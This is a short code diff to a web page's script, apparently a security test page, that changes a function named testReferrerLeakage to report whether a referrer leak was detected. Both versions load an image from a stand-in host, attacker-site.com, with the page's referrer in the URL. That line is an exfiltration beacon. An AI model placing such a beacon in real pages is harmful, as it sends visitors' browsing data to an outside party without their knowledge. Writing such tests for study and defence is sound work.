@@ -36,10 +36,15 @@
         }
 
         function testReferrerLeakage() {
+            let referrer = document.referrer || 'No referrer detected';
             let img = new Image();
-            img.src = "https://attacker-site.com/log?referrer=" + encodeURIComponent(document.referrer);
+            img.src = "https://attacker-site.com/log?referrer=" + encodeURIComponent(referrer);
             document.body.appendChild(img);
-            alert('Referrer sent to attacker site: ' + document.referrer + '. If you see a valid referrer, this is a vulnerability.');
+            if (referrer !== 'No referrer detected') {
+                alert('⚠️ Referrer Leak Detected! Referrer: ' + referrer + '\nThis indicates a possible vulnerability.');
+            } else {
+                alert('✅ No referrer leakage detected.');
+            }
         }
     </script>
 </head>
